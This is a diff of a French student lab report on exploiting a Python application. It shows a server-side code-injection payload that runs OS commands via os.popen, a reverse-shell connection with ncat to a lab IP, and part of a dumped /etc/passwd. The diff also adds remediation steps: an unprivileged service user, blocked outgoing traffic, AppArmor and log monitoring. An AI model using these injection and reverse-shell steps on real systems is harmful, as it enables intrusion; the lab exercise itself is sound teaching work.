@@ -74,6 +74,7 @@ L'application sert à faire des opérations
 🌞 Injecter du code serveur
 
 Elements modifiés
+
 ```
 import os
 userMessage = "__import__('os').popen('whoami').read()"
@@ -88,7 +89,7 @@ PS D:\Reseau-Linux\R-seau_B2\TP5>
 3. Reverse shell
 🌞 Obtenez un reverse shell sur le serveur
 
-```
+
 ```
 PS D:\Reseau-Linux\R-seau_B2\TP5> ncat 10.33.66.78 13338
 dfg
@@ -178,12 +179,32 @@ sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/usr/sbin/nologin
 chrony:x:997:995:chrony system user:/var/lib/chrony:/sbin/nologin
 it4:x:1000:1000:it4:/home/it4:/bin/bash
 tcpdump:x:72:72::/:/sbin/nologin
+```
 
 II. Remédiation
 🌞 Proposer une remédiation dév
 
-
-
+```
+ Voir: client.py (qui a été modifié) et server.py (modifié également)
+```
 
 🌞 Proposer une remédiation système
 
+```
+1. Créer un utilisateur non privilégié pour exécuter le serveur.
+   - sudo useradd -m -s /bin/false bs_server_user
+   - sudo chown bs_server_user /path/to/server
+
+2. Configurer les règles de pare-feu pour bloquer les connexions sortantes.
+   - sudo ufw default deny outgoing
+   - Autoriser uniquement les connexions nécessaires.
+
+3. Activer SELinux ou AppArmor pour restreindre les permissions du serveur.
+   - Exemple pour AppArmor : créer un profil restreint pour le serveur.
+
+4. Surveiller les logs pour toute activité inhabituelle.
+   - Configurer une alerte pour détecter toute tentative de connexion sortante non autorisée.
+
+5. S'assurer que l'application n'a accès qu'aux fichiers strictement nécessaires.
+   - Restreindre les permissions du répertoire du serveur.
+```
